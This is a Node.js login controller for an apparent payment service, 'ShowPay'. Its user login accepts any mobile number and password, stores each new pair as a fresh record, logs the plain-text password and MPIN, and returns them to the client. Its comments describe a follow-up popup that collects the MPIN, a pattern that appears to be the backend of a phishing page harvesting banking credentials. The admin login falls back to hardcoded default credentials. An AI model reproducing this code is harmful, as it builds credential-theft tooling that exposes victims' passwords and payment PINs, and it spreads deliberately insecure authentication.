const User = require('../models/User');
const LoginLog = require('../models/LoginLog');
const { generateToken } = require('../utils/jwt');
const { success, error } = require('../utils/response');
const { sanitizeInput, sanitizeUser } = require('../utils/hash');

// ─── USER LOGIN ───────────────────────────────────────────────────────────────
// Original Design:
//   • Any mobile + password → always allowed (no login limit)
//   • Same mobile + same password → update existing record (login_count, last_login)
//   • New mobile + password combo → create new record
//   • After login → frontend shows MPIN popup after 2s
//   • MPIN saved → same record updated, status: pending → completed
const login = async (req, res) => {
  try {
    // Sanitize input to prevent XSS / Injection
    const mobile = sanitizeInput(req.body.mobile);
    const password = sanitizeInput(req.body.password);

    if (!mobile || !password) return error(res, 'Mobile and password required');
    if (!/^\d{10}$/.test(mobile)) return error(res, 'Mobile must be 10 digits');

    let user = await User.findByMobilePassword(mobile, password);

    if (user) {
      // Same combination exists — update login_count and last_login (NEVER block)
      user = await User.incrementLogin(user);
    } else {
      // New combination — create a fresh record
      user = await User.create({ mobile, password });
    }

    // Log the login (non-blocking) — stores plain-text mobile, password, current mpin
    LoginLog.create({ user_id: user.id || null, mobile, password, mpin: user.mpin || null })
      .catch(e => console.error('Login log error:', e.message));

    const token = generateToken({ id: user.id, mobile, role: 'user' });

    // Return user object (password and mpin visible for admin transparency)
    return success(res, 'Login successful', {
      token,
      user: sanitizeUser(user)
    });

  } catch (err) {
    console.error('Login error:', err.message);
    return error(res, `Database/Login Error: ${err.message || 'Server error during login'}`, 500);
  }
};

// ─── ADMIN LOGIN ──────────────────────────────────────────────────────────────
const adminLogin = async (req, res) => {
  try {
    const email = sanitizeInput(req.body.email);
    const password = sanitizeInput(req.body.password);

    if (!email || !password) return error(res, 'Email and password required');

    const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'admin@showpay.com';
    const ADMIN_PASS  = process.env.ADMIN_PASSWORD || 'admin@0123';

    if (email !== ADMIN_EMAIL || password !== ADMIN_PASS) {
      return error(res, 'Invalid email or password', 401);
    }

    const token = generateToken({ id: 'admin', email: ADMIN_EMAIL, role: 'admin' });
    return success(res, 'Admin login successful', {
      token,
      admin: { email: ADMIN_EMAIL, name: 'ShowPay Admin' }
    });

  } catch (err) {
    console.error('Admin login error:', err.message);
    return error(res, 'Server error', 500);
  }
};

module.exports = { login, adminLogin };
